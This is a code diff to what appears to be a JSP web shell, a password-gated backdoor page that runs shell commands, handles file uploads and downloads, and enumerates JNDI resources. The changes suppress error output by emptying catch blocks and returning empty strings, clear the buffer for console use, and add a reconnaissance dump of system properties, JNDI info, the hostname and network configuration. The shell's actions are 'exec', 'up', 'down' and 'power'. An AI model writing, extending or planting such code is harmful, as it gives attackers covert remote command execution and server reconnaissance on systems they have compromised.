@@ -55,16 +55,11 @@
                             method.setAccessible(true);
                             out.println(formatMessage(propName+":"+method.invoke(jndiObject)));
                         } catch (IllegalAccessException e) {
-                            out.println(formatMessage(exceptionToString(e)));
-                        } catch (InvocationTargetException e) {
-                            out.println(formatMessage(exceptionToString(e)));
-                        }
+                        } catch (InvocationTargetException e) {}
                     }
                 }
             }
-        } catch (IntrospectionException e) {
-            out.println(formatMessage(exceptionToString(e)));
-        }
+        } catch (IntrospectionException e) { }
     }
 
     static void findJndi(String path, Context ctx, JspWriter out) throws NamingException, IOException {
@@ -211,14 +206,14 @@
                     }
                 }
             } catch (IOException ex) {
-                return exceptionToString(ex);
+                return "";
             } finally {
 
                 try {
                     inputStreamReader.close();
                     bufferedReader.close();
                 } catch (IOException e) {
-                    return exceptionToString(e);
+                    return "";
                 }
             }
             return stringBuffer.toString();
@@ -256,8 +251,6 @@
                 throw new IllegalArgumentException("boundary");
 
             boundary = "--" + boundary;
-
-
             StringTokenizer stLine, stFields;
             FileInfo fileInfo;
             Hashtable dataTable = new Hashtable(5);
@@ -270,14 +263,11 @@
                 File f = new File(saveInDir);
                 f.mkdirs();
             }
-
-
             line = getLine(is);
             if (line == null || !line.startsWith(boundary))
                 throw new IOException("Boundary not found;"
                         +" boundary = " + boundary
                         +", line = "    + line);
-
 
             while (line != null)
             {
@@ -289,26 +279,21 @@
                 if (line == null)
                     return dataTable;
 
-
                 stLine = new StringTokenizer(line, ";\r\n");
                 if (stLine.countTokens() < 2)
                     throw new IllegalArgumentException("Bad data in second line");
-
 
                 line = stLine.nextToken().toLowerCase();
                 if (line.indexOf("form-data") < 0)
                     throw new IllegalArgumentException("Bad data in second line");
 
-
                 stFields = new StringTokenizer(stLine.nextToken(), "=\"");
                 if (stFields.countTokens() < 2)
                     throw new IllegalArgumentException("Bad data in second line");
 
-
                 fileInfo = new FileInfo();
                 stFields.nextToken();
                 paramName = stFields.nextToken();
-
 
                 isFile = false;
                 if (stLine.hasMoreTokens())
@@ -360,7 +345,6 @@
                         fileInfo.setFileContentType(stLine.nextToken());
                     }
                 }
-
 
                 if (skipBlankLine)
                 {
@@ -582,6 +566,8 @@
 %>
 
 <%
+    //the objective is to useit in a console so lets get rid of does \n
+    out.clearBuffer();
     String actions[] = {"exec", "up", "down", "power"};
     String reqPass = request.getParameter("pass");
     String reqMethod = request.getMethod();
@@ -589,12 +575,11 @@
     String reqPath = request.getParameter("path");
     String reqAction  = request.getParameter("action");
     String reqArgs  = request.getParameter("args");
-
     Command command = new Command();
-
     if (isNotEmpty(reqPass) && reqPass.equals(application.getInitParameter("pass"))) {
         String appPath = application.getRealPath(request.getRequestURI());
         String path = isNotEmpty(reqPath) ? reqPath : findRealPath(appPath);
+
         if (isNotEmpty(reqMethod) && "GET".equalsIgnoreCase(reqMethod)) {
             if (isNotEmpty(reqAction) && reqAction.equals(actions[0]) && isNotEmpty(reqArgs)) {
                 out.println(formatMessage(command.runCommand(reqArgs)));
@@ -629,17 +614,22 @@
             } else if (isNotEmpty(reqAction) && reqAction.equals(actions[3])) {
                 out.println(formatMessage(command.runPowerCommand(reqArgs)));
             } else {
+                out.println(formatMessage("====== Java System properties ======"));
                 Properties props = System.getProperties();
                 Attributes attributes[] = Attributes.values();
                 int attributesSize = attributes.length;
                 for (int i=0; i < attributesSize; i++) {
                     String attributeName = attributes[i].name();
                     String attributeValue = attributes[i].value();
-                    out.println(formatMessage(attributeName+": "+props.getProperty(attributeValue)));
+                    String propValue = props.getProperty(attributeValue);
+                    out.println(formatMessage(attributeName+": "+propValue));
                 }
-
+                out.println(formatMessage("====== JNDI info ======"));
                 InitialContext ctx = new InitialContext();
                 findJndi("java:comp", ctx, out);
+                out.println(formatMessage("====== Network ======"));
+                out.println(formatMessage("Hostname:\t"+command.runCommand("hostname")));
+                out.println(formatMessage(command.ipconfig()));
             }
         } else if (isNotEmpty(reqMethod) && "POST".equalsIgnoreCase(reqMethod)) {
             if(isNotEmpty(reqContentType) && reqContentType.startsWith("multipart")) {
